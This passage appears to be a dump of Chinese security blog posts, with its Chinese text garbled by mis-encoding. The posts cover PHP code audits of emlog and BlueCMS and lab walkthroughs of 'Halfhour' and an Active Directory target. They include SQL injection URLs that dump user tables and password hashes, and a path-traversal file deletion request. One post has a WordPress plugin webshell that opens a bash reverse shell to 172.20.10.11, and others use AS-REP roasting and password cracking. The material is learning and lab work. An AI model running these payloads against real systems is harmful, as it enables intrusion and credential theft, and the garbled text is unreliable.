æ˜¯å¦æœ‰å…¶ä»–é”™è¯¯æ£€æŸ¥æ–‡ä»¶åç¼€æ˜¯å¦ä¸º zipä½¿ç”¨emUnZipå‡½æ•°è§£å‹ä¸Šä¼ çš„ ZIP æ–‡ä»¶åˆ°../content/templates/ç›®å½•æ ¹æ®è§£å‹ç»“æœè·³è½¬åˆ°ä¸åŒçš„é¡µé¢å¹¶å¸¦ä¸Šç›¸åº”çš„é”™è¯¯å‚æ•°å®‰å…¨é—®é¢˜åˆ†æ\tä¸ä»…æ–‡ä»¶ä¸Šä¼ éªŒè¯ä¸ä¸¥æ ¼ï¼Œæ›´ä¸¥é‡çš„æ˜¯å¯¹è§£å‹åçš„æ–‡ä»¶æ²¡æœ‰ä»»ä½•å®‰å…¨è¿‡æ»¤åªåˆ¤æ–­äº†åç¼€æ˜¯å¦æ˜¯ZIPif ($action === upload_zip) LoginAuth::checkToken(); $zipfile = isset($_FILES[tplzip]) ? $_FILES[tplzip] : ; if ($zipfile[error] == 4) emDirect(./template.php?error_d=1); if ($zipfile[error] == 1) emDirect(./template.php?error_f=1); if (!$zipfile || $zipfile[error] 0 || empty($zipfile[tmp_name])) emMsg(æ¨¡æ¿ä¸Šä¼ å¤±è´¥ï¼Œ é”™è¯¯ç ï¼š . $zipfile[error]); if (getFileSuffix($zipfile[name]) != zip) emDirect(./template.php?error_a=1); $ret = emUnZip($zipfile[tmp_name], ../content/templates/, tpl); switch ($ret) case 0: emDirect(./template.php?activate_install=1); break; case -2: emDirect(./template.php?error_e=1); break; case 1: case 2: emDirect(./template.php?error_b=1); break; case 3: emDirect(./template.php?error_c=1); break; æ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ’ä»¶ä¹Ÿæ˜¯ä¸€æ ·çš„æ‰€ä»¥ä½ æ‰¾åˆ°äº†æ¨¡æ¿ä¸Šä¼ ä¹Ÿæ‰¾å¾—åˆ°æ’ä»¶ä¸Šä¼  ä»£ç ä¸€æ‘¸ä¸€æ · æ²¡æœ‰é™åˆ¶PHPå®‰è£…ï¼Œæ²¡æœ‰é™åˆ¶å‡½æ•°ï¼Œåªæ£€æŸ¥åç¼€if ($action == upload_zip) LoginAuth::checkToken(); $zipfile = isset($_FILES[pluzip]) ? $_FILES[pluzip] : ; if ($zipfile[error] == 4) emDirect(./plugin.php?error_d=1); if ($zipfile[error] == 1) emDirect(./plugin.php?error_g=1); if (!$zipfile || $zipfile[error] = 1 || empty($zipfile[tmp_name])) emMsg(æ’ä»¶ä¸Šä¼ å¤±è´¥ï¼Œ é”™è¯¯ç ï¼š . $zipfile[error]); if (getFileSuffix($zipfile[name]) != zip) emDirect(./plugin.php?error_f=1); $ret = emUnZip($zipfile[tmp_name], ../content/plugins/, plugin); switch ($ret) case 0: emDirect(./plugin.php?activate_install=1); break; case -1: emDirect(./plugin.php?error_e=1); break; case 1: case 2: emDirect(./plugin.php?error_b=1); break; case 3: emDirect(./plugin.php?error_c=1); break; æ¡ˆä¾‹2-emlog-6.0.0ä»»æ„æ–‡ä»¶åˆ é™¤æ‰¾åˆ°åå°ç•Œé¢ç³»ç»Ÿ-æ•°æ®é”å®šæ–‡ä»¶data.php æ‰¾åˆ°ä»£ç æ˜¯ éå¸¸ç®€å•æš´åŠ› æ³¨æ„è¿™é‡Œbakæ˜¯æ•°ç»„å‰ç«¯æ˜¯td width=22input type=checkbox value=?php echo $value; ? name=bak[] class=ids //tdif ($action == dell_all_bak) if (!isset($_POST[bak])) emDirect(./data.php?error_a=1); else foreach ($_POST[bak] as $val) unlink($val); emDirect(./data.php?active_del=1); http://192.168.1.56:900//admin/data.php?action=dell_all_bakbak[]=../../../../../../../1.txt å¯ä»¥åˆ é™¤æ ¹ç›®å½•æ–‡ä»¶ ç›´æ¥æ„é€ æ•°æ®åŒ…ä»»æ„åˆ é™¤","tags":["upload","LFI"]},{"title":"åŸç”ŸPHPä»£ç å®¡è®¡-sqlæ³¨å…¥","path":"/2025/09/20/posts/code1php/","content":"åŸç”ŸPHPä»£ç å®¡è®¡-sqlæ³¨å…¥ ä¸‰ç§æ–¹æ³•ï¼š æ•°æ®åº“æ–¹é¢-sqlæ³¨å…¥ 1ï¼šè¯­å¥ç›‘æ§ ç›‘æ§sqlè¯­å¥æ˜¯å¦å¯ä»¥åˆ©ç”¨ 2ï¼šåŠŸèƒ½è·Ÿè¸ª .*å•ä¸ªå­—ç¬¦ ï¼Ÿå¯åŠ¨éè´ªå©ªæ¨¡å¼ 3ï¼šæ­£åˆ™æœç´¢sqlè¯­å¥(update|select|insert|delete|).*?where.*= æ¡ˆä¾‹1BLUECMSæ­å»ºPHPé€‰æ‹©5ç‰ˆæœ¬PHPSTUDYé€‰ä¸­é‡Œé¢çš„uploadsç›®å½•urlè¾“å…¥/installå®‰è£…è®¾ç½®uploadsæƒé™ä¸ºå¯å†™è®¾ç½®åä¸ç®¡ä»–æ˜¯ç™½å±è¿˜æ˜¯æ€ä¹ˆæ ·ç›´æ¥è¾“å…¥æ ¹ç›®å½•è¿›å…¥ç•Œé¢æ˜¾ç¤º ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢ (update|select|insert|delete|).*?where.*?=* é”å®šè¿™ä¸ªad_js.phpæ–‡ä»¶ çœ‹åˆ°å…¶ä»–çš„admin.phpå¯èƒ½æ˜¯ç®¡ç†å‘˜çš„ç•Œé¢ $ad = $db-getone(SELECT * FROM .table(ad). WHERE ad_id =.$ad_id); çœ‹è¿™ä¸ªä»£ç çš„å˜é‡æ˜¯å¦å¯æ§å¾€ä¸Šçœ‹å‘ç°è¿™ä¸ªå˜é‡æ˜¯é€šè¿‡GETä¼ è¾“çš„å‘ç°å¯æ§$ad_id = !empty($_GET[ad_id]) ? trim($_GET[ad_id]) : ;if(empty($ad_id))\techo Error!;\texit(); åœ¨phpä¸­.è¡¨ç¤ºç›´æ¥æ‹¼æ¥æˆ‘ä»¬è®¿é—®è¯•è¯• è¾“å…¥URL/ad_js.php?ad_id=1%20order%20by%208 æç¤ºErrorï¼šQuery error:SELECT * FROM blue_ad WHERE ad_id =1 order by 8è¾“å…¥URL/ad_js.php?ad_id=1%20order%20by%207ä¸æŠ¥é”™è¿™é‡Œä¸åŠ å› ä¸ºæ˜¯æ•°å­—ä¸ç”¨é—­åˆï¼Œé”å®šå­—æ®µæ˜¯7ä¸ªè€Œä¸”æœ‰å›æ˜¾è¡¨ç¤ºä»–çš„ä»£ç æœ‰returnè¾“å…¥ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,database()å³é”®æºç å‘ç°!--document.write(localhost);--å‘ç°æ•°æ®åº“åæ˜¯localhostå› ä¸ºæˆ‘åˆ›å»ºæ—¶å€™æŠŠå‘½ä»¤è®¾ç½®è¿™ä¸ªäº†.. ç„¶åæˆ‘ä»¬å°±å¯ä»¥sqlæ³¨å…¥æŸ¥è¯¢å‡ºè´¦å·å¯†ç ç™»å½•åå° 1 order by 71 union select 1,2,3,4,5,6,7è·å–å­—æ®µå1 UNION SELECT 1,2,3,4,5,6,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()å¾—åˆ°blue_user 0x626C75655F75736572è¿™æ˜¯ä»–çš„16è¿›åˆ¶ é˜²æ­¢è½¬ä¹‰æŠ¥é”™1 UNION SELECT 1,2,3,4,5,6,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=0x626C75655F75736572å¾—åˆ° å­—æ®µuser_id,user_name,pwd,email,birthday,sex,money,face_pic,mobile_phone,home_phone,office_phone,qq,msn,address,reg_time,last_login_time,last_login_ip1%20UNION%20SELECT%201,2,3,4,5,6,group_concat(user_name,0x3a,pwd)%20from%20blue_userå¾—åˆ°æ•°æ® document.write(root:63a9f0ea7bb98050796b649e85481845); 0x3aè¡¨ç¤ºå†’å·è¿›è¡Œæ‹¼æ¥ å¦‚æœæ²¡æœ‰å›æ˜¾ å°±ç”¨sqlmapè·‘å»¶æ—¶æ³¨å…¥ æ¡ˆä¾‹2-emlog-åå°æ¼æ´å®‰è£…è¯´æ˜ emlog_6.0.0PHP7ç‰ˆæœ¬ç›´æ¥è¾“å…¥URLå¯æ­å»ºæå‰æ„å»ºæ•°æ®åº“ é€šè¿‡CNVD-æ¼æ´æè¿°æ‰¾åˆ°æ–‡ä»¶ æ‰¾åˆ°è¿™ä¸ªåœ°æ–¹ è¿™é‡Œçš„sqlè¯­å¥æ²¡æœ‰é˜²æŠ¤ ä»£ç ä¸­çš„ SQL è¯­å¥ç›´æ¥å°†ç”¨æˆ·è¾“å…¥çš„$ipå˜é‡æ‹¼æ¥åˆ°æŸ¥è¯¢ä¸­ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–å‚æ•°åŒ–å¤„ç†ï¼šå‡è®¾$ipçš„å€¼è¢«ä¼ å…¥ï¼š127.0.0.1 OR 1=1ï¼Œé‚£ä¹ˆå®é™…æ‰§è¡Œçš„ SQL ä¼šå˜æˆï¼š-- æŸ¥è¯¢è¯­å¥ä¼šå˜æˆï¼šSELECT DISTINCT gid FROM è¡¨å WHERE ip=127.0.0.1 OR 1=1-- åˆ é™¤è¯­å¥ä¼šå˜æˆï¼šDELETE FROM è¡¨å WHERE ip=127.0.0.1 OR 1=1 è§¦å‘éœ€è¦admincomment.php?actiondelbyip /admin/comment.php?action=delbyip æç¤º è¿™é‡Œéœ€è¦æ”¾ä¸Šå»token ä»£ç è¯´æ£€æŸ¥è¿™é‡Œçš„token èµ‹å€¼ä¸ºtoken=xxæˆ‘ä»¬å¯ä»¥è¯•è¯•public static function genToken() $token_cookie_name = EM_TOKENCOOKIE_ . md5(substr(AUTH_KEY, 16, 32) . UID); if (isset($_COOKIE[$token_cookie_name])) return $_COOKIE[$token_cookie_name]; else $token = md5(getRandStr(16)); setcookie($token_cookie_name, $token, 0, /); return $token; è¾“å…¥tokenåè·³åˆ°äº†è¿™é‡Œ URLadmincomment.php?actiondelbyiptoken844dcfdf25339db310d07c152cdb3794 ç°åœ¨æˆ‘ä»¬å°±ä»£å…¥æˆ‘ä»¬IPå‚æ•°æ¥æ³¨å…¥äº†å› ä¸ºé€»è¾‘å¾€ä¸‹èµ°äº† å› ä¸ºè¿™é‡Œæ²¡æœ‰å›æ˜¾æ‰€ä»¥æˆ‘ä»¬æŠ¥é”™æ³¨å…¥ 0x7eæ˜¯~æŠ¥é”™æ—¶å€™å®¹æ˜“è¯†åˆ«admin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20user()),0x7e)))%20--+1 è·å¾—æ•°æ®åº“åXPATH syntax error: ~emlog1~admin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20database()),0x7e)))%20--+2 å› ä¸ºæ˜¾ç¤ºä¸å…¨åˆ¤æ–­é•¿åº¦æ˜¯123åadmin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20length(group_concat(table_name)) from information_schema.tables where table_schema=emlog1),0x7e)))%20--+3 ä»110å­—ç¬¦å¼€å§‹è·å–å¾—åˆ°ä¸€ä¸ªè¡¨å«emlog_useradmin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20substr(group_concat(table_name),110,30) from information_schema.tables where table_schema=emlog1),0x7e)))%20--+æˆ–è€…ç”¨limit è·³è¿‡å‰9ä¸ªè¡¨åï¼Œè¿”å›ç¬¬10ä¸ªè¡¨åï¼ˆå› ä¸ºè®¡æ•°ä»0å¼€å§‹ï¼‰ã€‚and(extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=emlog1),0x7e))) -- å¾—åˆ°10ä¸ªand(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=emlog1 limit 9,1),0x7e))) --æŸ¥çœ‹å¾—åˆ°emlog_userå¾—åˆ°å­—æ®µ~uid,username,password,nickname,admin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(column_name) from information_schema.columns where table_schema=emlog1 and table_name=emlog_user),0x7e)))%20--+5è·å–æ•°æ®XPATH syntax error: ~root:$P$ByE7sTdselj5Pr83iphFe0eLadmin/comment.php?action=delbyiptoken=844dcfdf25339db310d07c152cdb3794ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(username,0x3a,password) from emlog_user),0x7e)))%20--+ æ¡ˆä¾‹3-emlog-pro äºŒæ¬¡æ³¨å…¥æ¼æ´-2.1.9ä½¿ç”¨å·¥å…·MySQLMonitor-1.1.jarå·¥å…·ç›‘æ§mysqlä»£ç  å…¶ä»–æ•°æ®åº“æœ‰è‡ªå¸¦ç›‘æ§ åç«¯ä»£ç å¯ä»¥çŸ¥é“è¿™é‡Œçš„emeræ˜¯æ•°æ®åº“ä¸­çš„nicknameæ•°å€¼ cnvdä¸­è¯´äº†æ˜¯äºŒæ¬¡æ³¨å…¥æˆ‘ä»¬å°±è¦æ‰¾å“ªé‡Œå¯ä»¥ä¿®æ”¹nicknameç­”æ¡ˆæ˜¯ç³»ç»Ÿä¸­çš„ä¸Šä¼ æ•°æ®åº“æ–‡ä»¶ æ’å…¥è¿™æ®µåœ¨æ•°æ®ä¸­ å†ä¸Šä¼  å¯ä»¥å‘ç°select æ‰§è¡Œäº†","tags":["sql"]},{"title":"Halfhouré¶æœº-Maze-é€šé…ç¬¦æ¼æ´","path":"/2025/09/18/posts/halfhour/","content":"Halfhouré¶æœº-Maze-é€šé…ç¬¦æ¼æ´ ä¿¡æ¯æ”¶é›†NMAPæ‰«æç«¯å£ â””â”€# nmap 172.20.10.2 -sT -p-Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-18 01:16 EDTNmap scan report for halfhour.dsz (172.20.10.2)Host is up (0.00016s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT STATE SERVICE22/tcp open ssh80/tcp open http1337/tcp open waste1338/tcp open wmc-log-svcMAC Address: 08:00:27:B7:2B:50 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds ncè®¿é—®1337 å’Œ 1338ç«¯å£è¯•è¯• å¾—åˆ°äº†ä¸€ä¸ªå¯†ç bobobo â”€# nc 172.20.10.2 1337 Please enter password: rootIncorrect password. Attempts left: 2Incorrect password. Attempts left: 1Too many failed attempts. Reset password? (yes/no)yesPlease send new password to port 1338. â”Œâ”€â”€(rootã‰¿kali)-[~/pspy]â””â”€# nc 172.20.10.2 1338Please send new password: 123Congratulations! Password reset successful!Old password: bobobo è®¿é—®80å³é”®å¾—åˆ°äº†ä¸€ä¸ªåŸŸåæ”¾åˆ°hostsæ‰“å¼€å‘ç°ä¸€ä¸ªwordpressç½‘ç«™ !-- halfhour.dsz -- è¿™é‡Œä¿¡æ¯æ”¶é›†æˆ–è€…ä½ ç”¨WPSCANæ‰«æ å¾—åˆ°ä¸€ä¸ªç”¨æˆ·todd ä½†æ˜¯ç”¨wpscanæ‰«æçˆ†ç ´å‡ºä¸æ¥ å‘ç°ä½¿ç”¨1338çš„å¯†ç æˆåŠŸç™»å½•åå°ç„¶åå°±æ˜¯ä¸Šä¼ æ’ä»¶åå¼¹shell æ”¾åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ä¸­ä¸Šä¼ æ’ä»¶ç‚¹å‡»å¯åŠ¨å³å¯åå¼¹shell?php/*** Plugin Name: WonderfulWebshell* Plugin URI: https://github.com/jckhmr/wonderfullwebshell* Description: Wordpress webshell used for demo purposes only* Version: 1.0* Author: jckhmr* Author URI: https://jckhmr.net* License: https://nosuchlicense*/exec(/bin/bash -c bash -i /dev/tcp/172.20.10.11/8888 01);? è·å¾—WWWæƒé™â””â”€# nc -lvvp 8888 listening on [any] 8888 ...connect to [172.20.10.11] from halfhour.dsz [172.20.10.2] 44354bash: cannot set terminal process group (471): Inappropriate ioctl for devicebash: no job control in this shellwww-data@Halfhour:/var/www/halfhour.dsz/wp-admin$ ä¿¡æ¯æ”¶é›†æŸ¥çœ‹æ•°æ®é…ç½®æ–‡ä»¶å‘ç°å¯†ç root123 å’Œæ•°æ®åº“å¯†ç  å’Œ ä¸‰ä¸ªç”¨æˆ· æˆ‘ä»¬ä½¿ç”¨å¯†ç æ¥çˆ†ç ´ define( DB_USER, wpuser );/** Database password *//* define( DB_PASSWORD, root123 ); */define( DB_PASSWORD, your_strong_password );www-data@Halfhour:/var/www/halfhour.dsz$ ls /homels /homenxalwangjiangwelcome çˆ†ç ´ ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ”¾äº†nxalçˆ†ç ´wangjiangå¯†ç ä¸€ç›´é”™çš„åˆ é™¤äº†å¯¹äº† [22][ssh] host: 172.20.10.2 login: wangjiang password: root123[22][ssh] host: 172.20.10.2 login: nxal password: nxal ç™»å½•wangjiang æ‹¿åˆ°USER.TXT wangjiang@Halfhour:~$ cat user.txt flaguser-4c850c5b3b2756eXXXXXX å‘ç°æç¤ºç™»å½•welcomeç”¨æˆ·è¿™é‡Œå‘ç°ä¸€ä¸ªMD5 4c850c5b3b2756e67a91bad8e046ddac è§£å¯†aaaaaä½†æ˜¯ç™»å½•ä¸ä¸Šå•Šï¼Œä½†æ˜¯ç›´æ¥ç”¨å¯ä»¥ç™»å½•.. wangjiang@Halfhour:~$ cat note.txtGet user welcome firstwangjiang@Halfhour:~$ wangjiang@Halfhour:~$ cat .mysql_history_HiStOrY_V2_CREATE\\040DATABASE\\040wordpress;CREATE\\040USER\\040wpuser@localhost\\040IDENTIFIED\\040BY\\040your_strong_password;GRANT\\040ALL\\040PRIVILEGES\\040ON\\040wordpress.*\\040TO\\040wpuser@localhost;FLUSH\\040PRIVILEGES;EXIT;create\\040database\\040xxoo;use\\040xxooshow\\040tables;CREATE\\040TABLE\\040IF\\040NOT\\040EXISTS\\040user\\040(\\040\\040\\040\\040id\\040INT\\040AUTO_INCREMENT\\040PRIMARY\\040KEY,\\040\\040\\040\\040username\\040VARCHAR(50)\\040NOT\\040NULL\\040UNIQUE,\\040\\040\\040\\040password\\040CHAR(32)\\040NOT\\040NULL\\040COMMENT\\040MD5,\\040\\040\\040\\040created_at\\040TIMESTAMP\\040DEFAULT\\040CURRENT_TIMESTAMP)\\040ENGINE=InnoDB\\040DEFAULT\\040CHARSET=utf8mb4;CREATE\\040TABLE\\040IF\\040NOT\\040EXISTS\\040user\\040(\\040\\040\\040\\040\\040id\\040INT\\040AUTO_INCREMENT\\040PRIMARY\\040KEY,\\040\\040\\040\\040\\040username\\040VARCHAR(50)\\040NOT\\040NULL\\040UNIQUE,\\040\\040\\040\\040\\040password\\040CHAR(32)\\040NOT\\040NULL\\040COMMENT\\040MD5,\\040\\040\\040\\040\\040created_at\\040TIMESTAMP\\040DEFAULT\\040CURRENT_TIMESTAMP\\040)\\040ENGINE=InnoDB\\040DEFAULT\\040CHARSET=utf8mb4;INSERT\\040INTO\\040user\\040(username,\\040password)\\040VALUES\\040(welcome,\\0404c850c5b3b2756e67a91bad8e046ddac)ON\\040DUPLICATE\\040KEY\\040UPDATE\\040password\\040=\\040VALUES(password);INSERT\\040INTO\\040user\\040(username,\\040password)\\040\\040VALUES\\040(welcome,\\0404c850c5b3b2756e67a91bad8e046ddac)\\040ON\\040DUPLICATE\\040KEY\\040UPDATE\\040password\\040=\\040VALUES(password);show\\040tables;select\\040*\\040from\\040users;select\\040*\\040from\\040user;show\\040tables;show\\040databases;wangjiang@Halfhour:~$ ROOTè¿™é‡Œå‘ç°å¯ä»¥ç”¨è¿™ä¸ªdelæ–‡ä»¶ User welcome may run the following commands on Halfhour: (ALL) NOPASSWD: /usr/local/bin/del.shwelcome@Halfhour:/home/wangjiang$ cat /usr/local/bin/del.sh#!/bin/bashPATH=/usr/bincd /tmpcat /root/root.txt | tr -d [A-Za-z0-9] æ–¹æ³•1 é€šé…ç¬¦é—®é¢˜ è¿™é‡Œé€šé…ç¬¦æ²¡æœ‰åŠ å…¥å¼•å· æ¯”å¦‚ä½ åœ¨tmpåˆ›å»ºæ–‡ä»¶A ä»–å°±ä¼šåŒ¹é…A å°±å˜ä¸º tr -d A åªä¼šæ›¿æ¢Açš„å¦‚æœåŠ äº†å¼•å· â€œåŠ å¼•å·â€ æ˜¯ä¸ºäº†æ˜ç¡®å‘Šè¯‰ Shellï¼šå‚æ•°æ˜¯çº¯å­—ç¬¦ä¸²ï¼Œä¸è¦å¯¹å…¶è¿›è¡Œé€šé…ç¬¦åŒ¹é…ã€å˜é‡æ›¿æ¢ç­‰è§£ææ“ä½œroot@Halfhour:/home/wangjiang# cd /tmproot@Halfhour:/tmp# touch Aroot@Halfhour:/tmp# sudo /usr/local/bin/del.shflagroot-4c850c5b3b2756e67a91bad8e046ddacroot@Halfhour:/tmp# root@Halfhour:/tmp# æ–¹æ³•2 ç›´æ¥ç”¨å‰é¢boboboå¯†ç ç™»å½• welcome@Halfhour:/home/wangjiang$ su rootPassword: root@Halfhour:/home/wangjiang# whoamiroot","tags":["é€šé…ç¬¦","wordpress"]},{"title":"Confidenceé¶æœº-Maze-windows","path":"/2025/09/12/posts/confidence/","content":"Confidenceé¶æœº-Maze-windows-ESC1 userflagNMAPæ‰«æç«¯å£ nmap -sT -sC -p- 192.168.10.132 PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap| ssl-cert: Subject: commonName=dc.confidence.com| Subject Alternative Name: othername:unsupported, DNS:dc.confidence.com| Not valid before: 2025-09-09T12:14:33|_Not valid after: 2026-09-09T12:14:33|_ssl-date: TLS randomness does not represent time445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl| ssl-cert: Subject: commonName=dc.confidence.com| Subject Alternative Name: othername:unsupported, DNS:dc.confidence.com| Not valid before: 2025-09-09T12:14:33|_Not valid after: 2026-09-09T12:14:33|_ssl-date: TLS randomness does not represent time3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=dc.confidence.com| Subject Alternative Name: othername:unsupported, DNS:dc.confidence.com| Not valid before: 2025-09-09T12:14:33|_Not valid after: 2026-09-09T12:14:335985/tcp open wsman9389/tcp open adws49664/tcp open unknown49667/tcp open unknown49669/tcp open unknown59557/tcp open unknown59558/tcp open unknown59565/tcp open unknown59574/tcp open unknown59580/tcp open unknown59610/tcp open unknownMAC Address: 00:0C:29:F7:7B:D8 (VMware)Host script results:| smb2-time: | date: 2025-09-11T06:05:46|_ start_date: N/A|_nbstat: NetBIOS name: DC, NetBIOS user: unknown, NetBIOS MAC: 00:0c:29:f7:7b:d8 (VMware)| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: -3sNmap done: 1 IP address (1 host up) scanned in 247.87 secondsæ‰«æå®Œå†™å…¥åˆ°hostsé‡Œé¢ å…ˆæµ‹è¯•smbæœ‰æ— å…±äº«æ–‡ä»¶ â””â”€# crackmapexec smb 192.168.10.132 -u -p --sharesSMB 192.168.10.132 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:confidence.com) (signing:True) (SMBv1:False)SMB 192.168.10.132 445 DC [+] confidence.com\\: SMB 192.168.10.132 445 DC [-] Error enumerating shares: STATUS_ACCESS_DENIED# smbclient -L //192.168.10.132 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk è¿œç¨‹ç®¡ç† C$ Disk é»˜è®¤å…±äº« IPC$ IPC è¿œç¨‹ IPC NETLOGON Disk Logon server share readme Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.10.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available å‘ç°ä¸€ä¸ªreadmeçœ‹çœ‹å‘¢ â””â”€# smbclient //192.168.10.132/readme Password for [WORKGROUP\\root]:Try help to get a list of possible commands.smb: \\ ls . D 0 Tue Sep 9 09:25:09 2025 .. DHS 0 Tue Sep 9 09:28:52 2025 readme.txt.txt A 273 Tue Sep 9 09:25:11 2025 12923135 blocks of size 4096. 7950004 blocks availablesmb: \\ get readme.txt.txt æ²¡å‘ç°ä»€ä¹ˆä¿¡æ¯â””â”€# cat /root/readme.txt.txt Ive already disabled Windows Defender, and the system updates have been completed. So, enjoy exploring! If you run into any issues or get stuck, feel free to reach out to me, Wackymaker. My intention is simply to make sure everyone can learn something from this experience smbå¯ä»¥åŒ¿åè¯•è¯• lookidè·å–ä¸‹ç”¨æˆ· â”€# lookupsid.py lucy@192.168.10.132/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password:[*] Brute forcing SIDs at 192.168.10.132[*] StringBinding ncacn_np:192.168.10.132[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491498: CONFIDENCE\\Enterprise Read-only Domain Controllers (SidTypeGroup)500: CONFIDENCE\\Administrator (SidTypeUser)501: CONFIDENCE\\Guest (SidTypeUser)502: CONFIDENCE\\krbtgt (SidTypeUser)512: CONFIDENCE\\Domain Admins (SidTypeGroup)513: CONFIDENCE\\Domain Users (SidTypeGroup)514: CONFIDENCE\\Domain Guests (SidTypeGroup)515: CONFIDENCE\\Domain Computers (SidTypeGroup)516: CONFIDENCE\\Domain Controllers (SidTypeGroup)517: CONFIDENCE\\Cert Publishers (SidTypeAlias)518: CONFIDENCE\\Schema Admins (SidTypeGroup)519: CONFIDENCE\\Enterprise Admins (SidTypeGroup)520: CONFIDENCE\\Group Policy Creator Owners (SidTypeGroup)521: CONFIDENCE\\Read-only Domain Controllers (SidTypeGroup)522: CONFIDENCE\\Cloneable Domain Controllers (SidTypeGroup)525: CONFIDENCE\\Protected Users (SidTypeGroup)526: CONFIDENCE\\Key Admins (SidTypeGroup)527: CONFIDENCE\\Enterprise Key Admins (SidTypeGroup)553: CONFIDENCE\\RAS and IAS Servers (SidTypeAlias)571: CONFIDENCE\\Allowed RODC Password Replication Group (SidTypeAlias)572: CONFIDENCE\\Denied RODC Password Replication Group (SidTypeAlias)1000: CONFIDENCE\\DC$ (SidTypeUser)1101: CONFIDENCE\\DnsAdmins (SidTypeAlias)1102: CONFIDENCE\\DnsUpdateProxy (SidTypeGroup)1103: CONFIDENCE\\ca-admin (SidTypeGroup)1104: CONFIDENCE\\ca-user (SidTypeUser)1105: CONFIDENCE\\mulis (SidTypeUser)1106: CONFIDENCE\\hyh (SidTypeUser) å‘ç°ç”¨æˆ·hyh mulis ca-user ç„¶åç”¨GetNPUsers.py è·å–æ²¡æœ‰å¼€å¯åŸŸè®¤è¯çš„è´¦å·hash æˆåŠŸè·å–mulisçš„ç„¶åç”¨johnè§£å¯† #GetNPUsers.py -usersfile /root/maze/conficenceuser.txt -no-pass -dc-ip 192.168.10.132 confidence.com/Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User hyh doesnt have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$mulis@CONFIDENCE.COM:9757a526f685d1240449b7ccf2a4d87a$23f2b38d42eeddd793a20f980ab86d8e24807e64a9eeacef107b2e38258a8d154f8c8bc7ca17362af2ef366cd0fa87139a8f797a9b36ac1f478925688cbc16dd75d448e5a36a2da41c2dc8bd328ad51a2183b40c8d2e07386e79903d6a7cd021d4b549b774ea8f6c746f7551ca68dd5c93dd8779652c7995107c7bedd3d5521560c39f904c8cfd5e5ccf4b4625dd0ae684eebc34b0342fb654705d3965528c8edbac29ac6f2c2aa867e851b5df7a1a139e4f1a821ca7704b986dd400d6c53795b25639375d761c4ec6f46f96bb695b7123d6fc545930f3a8cd7104c75ab82fcf776831e1cfaea248a50a758bba1e5e9d[-] User Administrator doesnt have UF_DONT_REQUIRE_PREAUTH set#john --wordlist=/usr/share/wordlists/rockyou.txt /root/maze/hashbabygirl ($krb5asrep$23$mulis@CONFIDENCE.COM) æ‹¿åˆ°åä¸çŸ¥é“å¹²å˜›äº†å› ä¸ºç”¨evilç™»å½•ä¸ä¸Šå»é—®é—®ä½œè€…è¯´æŸ¥çœ‹ldap ldapsearch -x -H ldap://192.168.10.132 -D mulis@confidence.com -w babygirl -b DC=confidence,DC=com (objectClass=user) sAMAccountName memberOf description servicePrincipalNameè·å–hyhæœ‰ä¸‹é¢ä¸€ä¸²# hyh, Users, confidence.comdn: CN=hyh,CN=Users,DC=confidence,DC=comdescription:: 6L+Z5p2h6Lev5piv5a+555qE77yM5L2G5piv5L2g55yL5Yiw55qE6L+Y5LiN5aSf 5aSamemberOf: CN=Remote Management Users,CN=Builtin,DC=confidence,DC=comsAMAccountName: hyhbase64åè½¬æ¢ä¸ºutf-8å¾—åˆ°ä¸å…¨é¢ æ„æ€æˆ‘ä»¬ldapä¸å…¨æ¢å‘½ä»¤ ldapsearch -x -H ldap://192.168.10.132 -D mulis@confidence.com -w babygirl -b CN=hyh,CN=Users,DC=confidence,DC=com *è·å¾—å¯†ç info: Password: 3948571026ç™»å½•è·å¾—user*Evil-WinRM* PS C:\\Users\\hyh cd Desktop*Evil-WinRM* PS 